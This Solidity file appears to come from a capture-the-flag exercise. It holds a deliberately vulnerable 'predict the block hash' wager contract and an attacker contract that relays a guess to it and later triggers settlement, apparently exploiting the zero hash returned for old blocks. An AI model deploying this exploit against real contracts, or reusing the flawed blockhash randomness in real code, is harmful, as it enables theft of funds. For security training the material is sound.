pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
  address guesser;
  bytes32 guess;
  uint256 settlementBlockNumber;

  function PredictTheBlockHashChallenge() public payable {
    require(msg.value == 1 ether);
  }

  function isComplete() public view returns (bool) {
    return address(this).balance == 0;
  }

  function lockInGuess(bytes32 hash) public payable {
    require(guesser == 0);
    require(msg.value == 1 ether);

    guesser = msg.sender;
    guess = hash;
    settlementBlockNumber = block.number + 1;
  }

  function settle() public {
    require(msg.sender == guesser);
    require(block.number > settlementBlockNumber);

    bytes32 answer = block.blockhash(settlementBlockNumber);

    guesser = 0;
    if (guess == answer) {
      msg.sender.transfer(2 ether);
    }
  }
}

contract PredictTheBlockHashAttacker {
  PredictTheBlockHashChallenge victim;

  function PredictTheBlockHashAttacker(address victim_) public {
    victim = PredictTheBlockHashChallenge(victim_);
  }

  function lockInGuess(bytes32 hash_) public payable returns (uint256) {
    require(msg.value == 1 ether);

    bool success = (address(victim)).call.value(msg.value)(
      bytes4(keccak256('lockInGuess(bytes32)')),
      hash_
    );

    require(success);
  }

  function settle() public {
    victim.settle();
  }

  function() public payable {}
}
